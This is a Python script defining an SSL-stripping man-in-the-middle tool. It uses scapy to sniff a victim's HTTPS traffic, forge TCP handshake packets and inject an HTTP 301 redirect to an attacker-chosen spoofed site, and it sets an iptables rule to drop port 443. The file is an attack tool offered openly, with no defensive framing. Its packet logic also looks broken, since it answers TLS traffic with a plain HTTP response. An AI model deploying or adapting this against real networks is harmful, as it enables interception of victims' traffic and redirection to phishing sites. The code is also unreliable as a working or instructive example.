import subprocess
import atexit
from scapy.all import sniff, send, IP
from scapy.layers.inet import TCP
from scapy.packet import Raw

class SSLStripper:
    def __init__(self, interface, ip_victim, ip_attacker, site_to_spoof):
        self.interface = interface
        self.ip_victim = ip_victim
        self.ip_attacker = ip_attacker
        self.site_to_spoof = site_to_spoof

    def strip(self):
        print("[*] Starting SSL stripping...")
        add_iptables_rule(443)
        sniff(
            filter="tcp and port 443",
            prn=self._on_https_request,
            iface=self.interface,
            store=0
        )
        print("[*] SSL stripping stopped.")

    def _on_https_request(self, packet):
        if not packet.haslayer(IP) or not packet.haslayer(TCP):
            return

        if packet[IP].src != self.ip_victim or packet[IP].dst != self.ip_attacker:
            return

        tcp = packet[TCP]

        if tcp.flags == "S":  # SYN
            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       TCP(dport=tcp.sport, sport=tcp.dport, flags="SA", seq=1001, ack=tcp.seq + 1)
            send(response, verbose=0)

        elif tcp.flags == 0x11:  # FIN-ACK
            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       TCP(dport=tcp.sport, sport=tcp.dport, flags="FA", seq=tcp.ack, ack=tcp.seq + 1)
            send(response, verbose=0)

        elif tcp.flags == 0x10:  # ACK
            pass  # TCP handshake continues

        elif len(tcp.payload) > 0:
            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       TCP(dport=tcp.sport, sport=tcp.dport, flags="PA",
                           seq=tcp.ack, ack=tcp.seq + len(tcp.payload)) / \
                       Raw(load=f"HTTP/1.1 301 Moved Permanently\r\n"
                                f"Location: http://{self.site_to_spoof}\r\n\r\n")
            send(response, verbose=0)

def add_iptables_rule(port):
    subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])

def remove_iptables_rule(port):
    subprocess.run(["sudo", "iptables", "-D", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])

atexit.register(remove_iptables_rule, 443)
